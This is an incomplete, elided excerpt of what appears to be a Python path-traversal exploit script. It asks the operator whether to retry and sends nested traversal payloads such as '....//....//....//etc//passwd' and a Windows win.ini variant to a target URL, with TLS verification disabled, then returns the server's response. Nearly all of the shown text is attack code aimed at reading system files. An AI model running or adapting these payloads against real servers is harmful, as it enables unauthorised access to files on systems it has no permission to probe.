    ...
    if os_type == '1':
        ...
        if r.status_code == 400:
            ...
            if attempt_abs_path == 'Y':
                ...
                if r_abs.status_code == 400:
                    attempt_strip = input("Nested failed, attempt nested path (Y or N)? ")
                    if attempt_strip == 'Y':
                        r_strip = requests.get(url + '....//....//....//etc//passwd', proxies=proxies, verify=False)
                        return r_strip.text
                else:
                    return r_abs.text
            else:
        ...
        if 'file' in r.text:
            ...
            if attempt_abs_path == 'Y':
                ...
                if r_abs.status_code == 400:
                    attempt_strip = input("Nested failed, attempt nested path (Y or N)? ")
                    if attempt_strip == 'Y':
                        r_strip = requests.get(url + '....\/....\/....\/windows\/win.ini', proxies=proxies, verify=False)
                        return r_strip.text
                else:
                    return r_abs.text
            else:
